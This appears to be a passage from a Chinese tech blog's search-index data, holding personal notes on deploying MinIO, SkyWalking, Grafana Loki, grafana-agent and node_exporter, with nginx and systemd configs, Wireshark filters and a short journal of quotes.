Let systemd restart this service always Restart=always # Specifies the maximum file descriptor number that can be opened by this process LimitNOFILE=65536 # Specifies the maximum number of threads this process can create TasksMax=infinity # Disable timeout logic and wait until process is stopped TimeoutStopSec=infinity SendSIGKILL=no [Install] WantedBy=multi-user.target # Built for ${project.name}-${project.version} (${project.name}) 启动 systemctl enable minio --now nginx 代理配置 upstream minio_s3 { least_conn; server 10.0.1.152:9001; server 10.0.1.152:9002; server 10.0.1.152:9003; server 10.0.1.152:9004; } upstream minio_console { least_conn; server 10.0.1.152:9091; server 10.0.1.152:9092; server 10.0.1.152:9093; server 10.0.1.152:9094; } server { listen 80; server_name minio-api.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-api.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name minio-api.kentxxq.com; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-api.kentxxq.com.log k-json; # Allow special characters in headers ignore_invalid_headers off; # Allow any size file to be uploaded. # Set to a value such as 1000m; to restrict file size to a specific value client_max_body_size 0; # Disable buffering proxy_buffering off; proxy_request_buffering off; location / { proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_connect_timeout 300; # Default is HTTP/1, keepalive is only enabled in HTTP/1.1 proxy_http_version 1.1; proxy_set_header Connection \"\"; chunked_transfer_encoding off; proxy_pass http://minio_s3; } } # ui server { listen 80; server_name minio-ui.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-ui.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name minio-","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/#守护进程"},{"categories":["blog"],"content":" 集群部署 二进制安装我有 2 个机器。给每个节点加上一个 DNS 解析记录, 最好有统一的名称: minio1.kentxxq.com minio2.kentxxq.com 除了系统盘外，每个节点还有 2 个空的数据盘 (必须)。把数据盘挂载到系统 的 /mnt/minio{1,2} 目录 用户和目录准备: groupadd -r minio-user useradd -M -r -g minio-user minio-user # 模拟2个硬盘,2个节点 chown minio-user:minio-user /mnt/minio{1,2} 安装 minio, 官网安装页面 wget https://dl.min.io/server/minio/release/linux-amd64/minio chmod +x minio mv minio /usr/local/bin/ 环境配置文件 /etc/default/minio # 用户名和密码,集群之间是通过这个来校验的 MINIO_ROOT_USER=myminioadmin MINIO_ROOT_PASSWORD=minio-secret-key-change-me # api/9001 console-ui/9091 MINIO_OPTS=\"--address :9001 --console-address :9091\" # 2个节点互相发现,2个磁盘(除开系统盘) MINIO_VOLUMES=\"http://minio{1...2}.kentxxq.com:9000/mnt/minio{1...2}\" # 或者空格间隔 # MINIO_VOLUMES=\"http://minio1.kentxxq.com:9001/mnt/vdb1 http://minio2.kentxxq.com:9002/mnt/vdc1 http://minio3.kentxxq.com:9003/mnt/vdd1 http://minio4.kentxxq.com:9004/mnt/vde1\" # 请求地址 MINIO_SERVER_URL=\"https://minio-api.kentxxq.com\" MINIO_BROWSER_REDIRECT_URL=\"https://minio-ui.kentxxq.com\" 守护进程官方推荐 的 Systemd 守护配置存在位置 /etc/systemd/system/minio.service [Unit] Description=MinIO Documentation=https://min.io/docs/minio/linux/index.html Wants=network-online.target After=network-online.target AssertFileIsExecutable=/usr/local/bin/minio [Service] WorkingDirectory=/usr/local User=minio-user Group=minio-user ProtectProc=invisible EnvironmentFile=-/etc/default/minio ExecStartPre=/bin/bash -c \"if [ -z \\\"${MINIO_VOLUMES}\\\" ]; then echo \\\"Variable MINIO_VOLUMES not set in /etc/default/minio\\\"; exit 1; fi\" ExecStart=/usr/local/bin/minio server $MINIO_OPTS $MINIO_VOLUMES # MinIO RELEASE.2023-05-04T21-44-30Z adds support for Type=notify (https://www.freedesktop.org/software/systemd/man/systemd.service.html#Type=) # This may improve systemctl setups where other services use `After=minio.server` # Uncomment the line to enable the functionality # Type=notify # Let systemd restart this service always Restart=always # Specifies the maximum file descriptor number that can be opened by this process LimitNOFILE=65536 # Specifies the maximum number of threads this process can create TasksMax=infinity # Disable timeout logic and wait until process is stopped TimeoutStopSec=infinity SendSIGKILL=no [Install] WantedBy=multi-user.target # Built for ${project.name}-${project.version} (${project.name}) 启动 systemctl enable minio --now nginx 代理配置 upstream minio_s3 { least_conn; server 10.0.1.152:9001; server 10.0.1.152:9002; server 10.0.1.152:9003; server 10.0.1.152:9004; } upstream minio_console { least_conn; server 10.0.1.152:9091; server 10.0.1.152:9092; server 10.0.1.152:9093; server 10.0.1.152:9094; } server { listen 80; server_name minio-api.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-api.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name minio-api.kentxxq.com; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-api.kentxxq.com.log k-json; # Allow special characters in headers ignore_invalid_headers off; # Allow any size file to be uploaded. # Set to a value such as 1000m; to restrict file size to a specific value client_max_body_size 0; # Disable buffering proxy_buffering off; proxy_request_buffering off; location / { proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_connect_timeout 300; # Default is HTTP/1, keepalive is only enabled in HTTP/1.1 proxy_http_version 1.1; proxy_set_header Connection \"\"; chunked_transfer_encoding off; proxy_pass http://minio_s3; } } # ui server { listen 80; server_name minio-ui.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-ui.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name minio-","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/#nginx-代理配置"},{"categories":["blog"],"content":" 使用 浏览器打开登录 minio-ui.kentxxq.com 端口, 输入用户名和密码 查看集群信息 边栏 bucket 创建 demo1 边栏 access keys 创建 ak [!info] 默认地域 us-east-1 ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/#使用"},{"categories":["point"],"content":"skywalking 是一个链路追踪工具. 要点: 开源免费 java 支持很好 ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/:0:0","series":null,"tags":["point","skywalking"],"title":"skywalking","uri":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/#"},{"categories":["point"],"content":" 安装","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/:1:0","series":null,"tags":["point","skywalking"],"title":"skywalking","uri":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/#安装"},{"categories":["point"],"content":" 二进制版本 wget https://dlcdn.apache.org/skywalking/8.9.1/apache-skywalking-apm-8.9.1.tar.gz tar -xzf apache-skywalking-apm-8.9.1.tar.gz 修改配置 config/application.yml,用 elastic 存储数据 storage: selector: ${SW_STORAGE:elasticsearch} bin/startup.sh 启动后接入 mkdir -p /data/apm/ cd /data/apm wget https://dlcdn.apache.org/skywalking/java-agent/8.9.0/apache-skywalking-java-agent-8.9.0.tgz tar -xzf apache-skywalking-java-agent-8.9.0.tgz skywalking-agent # java启动命令添加参数 -javaagent:/data/apm/skywalking-agent/skywalking-agent.jar -Dskywalking.agent.service_name=服务名 -Dskywalking.collector.backend_service=skywalking服务端:11800 ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/:1:1","series":null,"tags":["point","skywalking"],"title":"skywalking","uri":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/#二进制版本"},{"categories":["point"],"content":" docker 版本 # 启动后台，并且消费kafka内的数据 # 12800/http 11800/grpc docker run --name oap --restart always -d -p11800:11800 -p12800:12800 -e SW_KAFKA_FETCHER=default -e SW_KAFKA_FETCHER_SERVERS=\"地址:9092\" -e SW_STORAGE=elasticsearch -e SW_STORAGE_ES_CLUSTER_NODES=地址:9200 -e SW_ES_USER=admin -e SW_ES_PASSWORD=\"密码\" apache/skywalking-oap-server:9.7.0 # 启动ui，对接后台 # 8080/http docker run --name oap-ui --restart always -d -p8080:8080 -e SW_OAP_ADDRESS=http://10.0.0.40:12800 -e SW_ZIPKIN_ADDRESS=http://10.0.0.40:9412 apache/skywalking-ui:9.7.0 nginx 配置 server { listen 80; server_name skywalking-ui-dev.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/skywalking-ui-dev.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name skywalking-ui-dev.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/skywalking-ui-dev.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_kentxxq.conf; location / { proxy_pass http://10.0.0.40:8080; } } ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/:1:2","series":null,"tags":["point","skywalking"],"title":"skywalking","uri":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/#docker-版本"},{"categories":["point"],"content":" docker-compose apiVersion: apps/v1 kind: Deployment metadata: name: skywalking-oap-deployment namespace: tools spec: replicas: 1 selector: matchLabels: app: skywalking-oap template: metadata: labels: app: skywalking-oap spec: containers: - name: skywalking-oap image: apache/skywalking-oap-server:9.7.0 env: - name: SW_STORAGE value: elasticsearch - name: SW_STORAGE_ES_CLUSTER_NODES value: 地址:9200 - name: SW_ES_USER value: \"admin\" - name: SW_ES_PASSWORD value: \"密码\" ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/:1:3","series":null,"tags":["point","skywalking"],"title":"skywalking","uri":"/posts/%E7%AC%94%E8%AE%B0/point/skywalking/#docker-compose"},{"categories":["journal"],"content":"2023-07-17 日记","date":"2023-07-17","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-17/","series":null,"tags":["journal"],"title":"2023-07-17","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-17/"},{"categories":["journal"],"content":"Facebook 说旅途完成了 1%, 亚马逊说永远保持 day 1 ,因为第二天就要追踪和目标不相关的内容, 是痛苦衰退的开始. 对于公司来说是这样, 但是作为一个员工或者个体, 你应该是有终点的. 在不同的时间段里, 完成不同的目标. 然后进入下一个阶段, 而不是永远 1% #fun/有意思的句子 每当你有一种 \" 应该有人在这里做某事 \" 的感觉，那个应该做这件事的人很可能就是你。 #fun/有意思的句子 我偶然发现了一种极其强大的编程哲学，那就是你应该忽略代码，那只是计算机要遵循的一大堆指令。相反地，你要专注于数据，弄清楚它如何流动。 #fun/有意思的句子 我把生活看成一系列 \" 角色扮演游戏 “。我的任务就是以最适合我的 \" 角色 \" 的方式玩我的 \" 游戏 “。游戏可以是任何东西，成为好学生、成为好父亲、做出明智的财务决策、领导一个项目、进行房屋翻新等等。这样的好处是，我的压力减轻了很多，我开始以中立的眼光看待一切，不在意演员是谁（包括我自己），只是客观地思考怎样才能取得游戏的最佳结果。 #fun/有意思的句子 跳出自己, 我有想过这个 教你写 Build Your Own: React, ProseMirror, and Redux #fun 当你向前看的时候, 你无法把点连起来. 你只能往回看. #fun/有意思的句子 ","date":"2023-07-17","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-17/:0:0","series":null,"tags":["journal"],"title":"2023-07-17","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-07-17/#"},{"categories":["blog"],"content":"grafana-loki 是 [[笔记/point/grafana|grafana]] 公司的日志采集组件","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介grafana-loki 是 grafana 公司的日志采集组件 ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 快速验证Loki安装文档链接,因为网络不佳, 所以使用二进制安装方式. 去 Releases · grafana/loki 下载 loki-linux-amd64.zip 和 promtail-linux-amd64.zip 压缩文件 下载配置文件 # loki启动配置文件 wget https://raw.githubusercontent.com/grafana/loki/main/cmd/loki/loki-local-config.yaml # promtail启动配置文件 wget https://raw.githubusercontent.com/grafana/loki/main/clients/cmd/promtail/promtail-local-config.yaml 启动 # windows .\\loki-windows-amd64.exe --config.file=loki-local-config.yaml # linux ./loki-linux-amd64 -config.file=loki-local-config.yaml ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/#快速验证"},{"categories":["blog"],"content":" loki 配置文件相关配置链接: loki的Storage文档 阿里云OSS配置 s3集群配置 #todo/笔记 loki 集群的配置? minio 版本: # 多租户的话,要启用这个. 每个租户一个文件夹 # 一个租户的话, 数据都会放在 fake 文件夹下面 auth_enabled: false server: http_listen_port: 3100 grpc_listen_port: 3101 common: instance_addr: 0.0.0.0 replication_factor: 1 ring: kvstore: store: inmemory query_range: results_cache: cache: embedded_cache: enabled: true max_size_mb: 100 storage_config: aws: # Note: use a fully qualified domain name, like localhost. # full example: http://loki:supersecret@localhost.:9000 s3: https://秘钥id:秘钥key@minio-api.kentxxq.com.:443/loki s3forcepathstyle: true boltdb_shipper: active_index_directory: /loki/boltdb-shipper-active cache_location: /loki/boltdb-shipper-cache cache_ttl: 24h # Can be increased for faster performance over longer query periods, uses more disk space shared_store: s3 schema_config: configs: - from: 2020-10-24 store: boltdb-shipper object_store: s3 schema: v11 index: prefix: index_ period: 24h compactor: working_directory: /loki/compactor shared_store: s3 compaction_interval: 5m ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/#loki-配置文件"},{"categories":["blog"],"content":" 守护进程Systemd 配置文件 /etc/systemd/system/loki.service [Unit] Description=loki # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 #WorkingDirectory=/root/myApp/TestServer ExecStart=/root/loki -config.file=/root/loki-minio-config.yaml # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target #Alias=testserver.service ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/#守护进程"},{"categories":["blog"],"content":" 查询日志 LogQL","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/#查询日志-logql"},{"categories":["blog"],"content":" 常用语法 # 查询标签 {filename=\"/var/log/syslog\"} =相等 !=不相等 =~正则匹配 !~正则不匹配 # 标签+包含字符 {filename=\"/var/log/syslog\"}|= \"Day\" |=包含 !=不包含 |~正则匹配 !~正则不匹配 # 向量和运算符 # 最近5分钟的日志记录数 count_over_time({filename=\"/var/log/syslog\"}[$__range]) ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/#常用语法"},{"categories":["blog"],"content":" 日志分割官网有几个日志分析的示例放在 LogQL Analyzer | Grafana Loki documentation,下面写一个日常会遇到的. 如果有多行日志, 可以在采集的时候配置 multiline | Grafana Loki documentation # 日志格式 level=info|ts=2022-03-23T11:55:29.846163306Z|caller=main.go:112|msg=\"Starting|Grafana|Enterprise|Logs\" level=debug|ts=2022-03-23T11:55:29.846226372Z|caller=main.go:113|version=v1.3.0|branch=HEAD|Revision=e071a811|LokiVersion=v2.4.2|LokiRevision=525040a3 level=warn|ts=2022-03-23T11:55:45.213901602Z|caller=added_modules.go:198|msg=\"found|valid|license\"|cluster=enterprise-logs-test-fixture level=info|ts=2022-03-23T11:55:45.214611239Z|caller=server.go:269|http=[::]:3100|grpc=[::]:9095|msg=\"server|listening|on|addresses\" level=debug|ts=2022-03-23T11:55:45.219665469Z|caller=module_service.go:64|msg=initialising|module=license level=warm|ts=2022-03-23T11:55:45.219678992Z|caller=module_service.go:64|msg=initialising|module=server level=error|ts=2022-03-23T11:55:45.221140583Z|caller=manager.go:132|msg=\"license|manager|up|and|running\" level=info|ts=2022-03-23T11:55:45.221254326Z|caller=loki.go:355|msg=\"Loki|started\" # 查询语句 {job=\"analyze\"} | pattern \"\u003clevel\u003e|\u003ctime\u003e|\u003ccaller\u003e|\u003cmsg\u003e\" | level=\"level=info\" ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["blog","promtail","loki","grafana"],"title":"grafana-loki教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-loki%E6%95%99%E7%A8%8B/#日志分割"},{"categories":["point"],"content":"wireshark 是一个抓包的工具. 要点: 免费 用户量大 图形化 ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/:0:0","series":null,"tags":["point","wireshark"],"title":"wireshark","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/#"},{"categories":["point"],"content":" 过滤查询 IP 和 MAC 地址 # 原始ip ip.src == 1.1.1.1 # 目标ip ip.dst == 1.1.1.1 # 查询往返 ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1 # 源mac eth.src == A0:00:00:04:C5:84 # 目标mac eth.dst == A0:00:00:04:C5:84 协议 # http协议 http || http2 # 非http !http 数据参数 # 显示包含TCP SYN标志的封包 tcp.flags.syn == 0x02 # http请求方法 http.request.method == \"GET\" 组合 (ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1) \u0026\u0026 http ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/:0:1","series":null,"tags":["point","wireshark"],"title":"wireshark","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/#过滤查询"},{"categories":["point"],"content":" 过滤查询 IP 和 MAC 地址 # 原始ip ip.src == 1.1.1.1 # 目标ip ip.dst == 1.1.1.1 # 查询往返 ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1 # 源mac eth.src == A0:00:00:04:C5:84 # 目标mac eth.dst == A0:00:00:04:C5:84 协议 # http协议 http || http2 # 非http !http 数据参数 # 显示包含TCP SYN标志的封包 tcp.flags.syn == 0x02 # http请求方法 http.request.method == \"GET\" 组合 (ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1) \u0026\u0026 http ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/:0:1","series":null,"tags":["point","wireshark"],"title":"wireshark","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/#ip-和-mac-地址"},{"categories":["point"],"content":" 过滤查询 IP 和 MAC 地址 # 原始ip ip.src == 1.1.1.1 # 目标ip ip.dst == 1.1.1.1 # 查询往返 ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1 # 源mac eth.src == A0:00:00:04:C5:84 # 目标mac eth.dst == A0:00:00:04:C5:84 协议 # http协议 http || http2 # 非http !http 数据参数 # 显示包含TCP SYN标志的封包 tcp.flags.syn == 0x02 # http请求方法 http.request.method == \"GET\" 组合 (ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1) \u0026\u0026 http ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/:0:1","series":null,"tags":["point","wireshark"],"title":"wireshark","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/#协议"},{"categories":["point"],"content":" 过滤查询 IP 和 MAC 地址 # 原始ip ip.src == 1.1.1.1 # 目标ip ip.dst == 1.1.1.1 # 查询往返 ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1 # 源mac eth.src == A0:00:00:04:C5:84 # 目标mac eth.dst == A0:00:00:04:C5:84 协议 # http协议 http || http2 # 非http !http 数据参数 # 显示包含TCP SYN标志的封包 tcp.flags.syn == 0x02 # http请求方法 http.request.method == \"GET\" 组合 (ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1) \u0026\u0026 http ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/:0:1","series":null,"tags":["point","wireshark"],"title":"wireshark","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/#数据参数"},{"categories":["point"],"content":" 过滤查询 IP 和 MAC 地址 # 原始ip ip.src == 1.1.1.1 # 目标ip ip.dst == 1.1.1.1 # 查询往返 ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1 # 源mac eth.src == A0:00:00:04:C5:84 # 目标mac eth.dst == A0:00:00:04:C5:84 协议 # http协议 http || http2 # 非http !http 数据参数 # 显示包含TCP SYN标志的封包 tcp.flags.syn == 0x02 # http请求方法 http.request.method == \"GET\" 组合 (ip.addr == 1.1.1.1 || ip.dst == 1.1.1.1) \u0026\u0026 http ","date":"2023-07-17","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/:0:1","series":null,"tags":["point","wireshark"],"title":"wireshark","uri":"/posts/%E7%AC%94%E8%AE%B0/point/wireshark/#组合"},{"categories":["point"],"content":"CNCF 是 CLOUD NATIVE COMPUTING FOUNDATION 的缩写, 云原生计算及机会的意思. 官网项目面板 Cloud Native Landscape 我的相关笔记: k8s helm prometheus ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/cncf/:0:0","series":null,"tags":["point","CNCF"],"title":"CNCF","uri":"/posts/%E7%AC%94%E8%AE%B0/point/cncf/#"},{"categories":["point"],"content":"devops 是一套流程流程. 要点: 计划 编码放到 git 构建 测试, 扫描 构建成 image 或推送公共仓库 部署工具, 例如 ansible ecs 的基础资源准备, k8s 的状态监测? 集群挑选? 对接 k8s 等平台, 例如创建 service 和 ingress 监控 grafana 反馈 ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/devops/:0:0","series":null,"tags":["point","devops"],"title":"devops","uri":"/posts/%E7%AC%94%E8%AE%B0/point/devops/#"},{"categories":["blog"],"content":"grafana-agent 是 [[笔记/point/grafana|grafana]] 公司的产品之一, 用于接收 OTLP 数据.","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-agent%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","grafana","grafana-agent"],"title":"grafana-agent教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-agent%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介grafana-agent 是 grafana 公司的产品之一, 用于接收 OTLP 数据. ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-agent%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","grafana","grafana-agent"],"title":"grafana-agent教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-agent%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装 # 准备 mkdir -p /etc/apt/keyrings/ wget -q -O - https://apt.grafana.com/gpg.key | gpg --dearmor | sudo tee /etc/apt/keyrings/grafana.gpg \u003e /dev/null echo \"deb [signed-by=/etc/apt/keyrings/grafana.gpg] https://apt.grafana.com stable main\" | sudo tee /etc/apt/sources.list.d/grafana.list # 安装 apt update -y; apt install grafana-agent -y # 启用 systemctl enable grafana-agent --now # 9090端口被占用,重新设置端口,并允许外部机器访问 vim /etc/default/grafana-agent CUSTOM_ARGS=\"-server.http.address=0.0.0.0:9091 -server.grpc.address=0.0.0.0:9092\" ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-agent%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","grafana","grafana-agent"],"title":"grafana-agent教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-agent%E6%95%99%E7%A8%8B/#安装"},{"categories":["point"],"content":"OpenTelemetry 是新一代的监控工具. 要点: 日志 指标 链路追踪 ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/opentelemetry/:0:0","series":null,"tags":["point","OpenTelemetry"],"title":"OpenTelemetry","uri":"/posts/%E7%AC%94%E8%AE%B0/point/opentelemetry/#"},{"categories":["blog"],"content":"这里记录主机监控的配置","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/","series":null,"tags":["blog","devops"],"title":"主机监控","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/"},{"categories":["blog"],"content":" 简介这里记录主机监控的配置 ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/:1:0","series":null,"tags":["blog","devops"],"title":"主机监控","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/#简介"},{"categories":["blog"],"content":" 操作手册 前置准备 安装prometheus 安装grafana 安装启动下载 node_exporter,并解压. 配置 supervisor 守护 /etc/supervisor/conf.d/node_exporter.conf [program:node_exporter] command = /root/node_exporter # 自动重启 autorestart = true # 启动失败的尝试次数 startretries = 3 # 进程20s没有退出，则判断启动成功 startsecs = 20 # 标准输出的文件路径 stdout_logfile = /tmp/node_exporter-supervisor.log # 日志文件最大大小 stdout_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stdout_logfile_backups = 5 # 标准输出的文件路径 stderr_logfile = /tmp/node_exporter-supervisor.log # 日志文件最大大小 stderr_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stderr_logfile_backups = 5 ","date":"2023-07-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/:2:0","series":null,"tags":["blog","devops"],"title":"主机监控","uri":"/posts/%E7%AC%94%E8%AE%B0/%E4%B8%BB%E6%9C%BA%E7%9B%91%E6%8E%A7/#操作手册"},{"categories":["blog"],"content":" 操作手册 前置准备 安装prometheus 安装grafana 安装启动下载 node_exporter,并解压. 配置 supervisor 守护 /etc/supervisor/conf.d/node_exporter.conf [program:node_exporter] command = /root/node_exporter # 自动重启 autorestart = true # 启动失败的尝试次数 startretries = 3 # 进程20s没有退出，则判断启动成功 startsecs = 20 # 标准输出的文件路径 stdout_logfile = /tmp/node_exporter-supervisor.log # 日志文件最大大小 stdout_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stdout_logfile_backups = 5 # 标准输出的文件路径 stderr_logfile = /tmp/node_exporter-supervisor.log # 日志文件最大大小 stderr_logfile_maxbytes=20MB # 日志文件保持数量 默认为10 设置为0 表示不限制 stderr_logfile_backups = 5 